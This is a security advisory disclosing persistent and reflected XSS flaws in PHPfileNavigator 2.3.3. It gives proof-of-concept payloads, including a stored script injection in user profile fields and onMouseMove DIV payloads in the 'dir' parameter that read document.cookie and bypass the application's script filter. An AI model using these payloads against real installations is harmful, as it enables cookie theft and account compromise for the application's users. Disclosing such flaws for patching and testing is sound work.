Vendor:
================================
pfn.sourceforge.net



Product:
===================================
PHPfileNavigator v2.3.3 (pfn)

Is state-of-the-art, open source web based application
to complete manage your files and folders.



Vulnerability Type:
=========================
Persistent & Reflected XSS



CVE Reference:
==============
N/A




Vulnerability Details:
=====================
Multiple persistent XSS vulnerable fields exist on the 'Modify User' form.
nome, usuario, email etc...

We can leverage existing CSRF vulnerability to update a victimz profile and
store malicious
XSS payload or an malicious user can inject there own payloads when
updating thier profilez
affecting other users and the security of the whole application.

Multiple reflected XSS exists as well for following PHP pages all with same
vulnerable
parameter 'dir' when issuing GET requests.

pfn-2.3.3 application seems to filter out <script> tags etc, but we can
bypass this using
<DIV onMouseMove= JS functions!.

navega.php

accion.php

preferencias.php


Tested using xampp-1.7.0


Exploit code(s):
===============

Persistent XSS:
---------------

POST URL:
http://localhost/PHPfileNavigator/pfn-2.3.3/xestion/usuarios/index.php?PHPSESSID=

e.g.

Inject <script>alert(666)</script> into the 'Name*', 'User*' or 'Email'
field
and click Accept button.

Injecting XSS into 'name' field will store the XSS payload in the pfn MySQL
database
in 'pfn_usuarios' table called 'nome' in the 'nome' column. The Same fate
will happen for
other injected fields 'email & 'usuario'.


Reflected XSS:
--------------

1)
http://localhost/PHPfileNavigator/pfn-2.3.3/navega.php?PHPSESSID=HELL&dir=
" <DIV  onMouseMove= "alert(document.cookie) " </a>

2)
http://localhost/PHPfileNavigator/pfn-2.3.3/accion.php?accion=buscador&PHPSESSID=HELL&dir=
" <DIV  onMouseMove= "alert(document.cookie) " </a>

3)
http://localhost/PHPfileNavigator/pfn-2.3.3/preferencias.php?PHPSESSID=HELL&dir=
